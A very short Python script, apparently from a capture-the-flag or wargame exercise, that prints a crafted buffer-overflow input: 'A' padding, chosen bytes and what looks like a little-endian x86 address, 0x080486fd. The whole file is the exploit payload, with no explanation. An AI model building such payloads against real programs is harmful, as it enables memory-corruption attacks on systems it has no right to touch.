import sys
printf = sys.stdout.write
printf('A'*12 + '\xee\xff\xff\xff\xbb\n')
printf('A\n'*23)
printf('\xfd\n\x86\n\x04\n\x08\n')
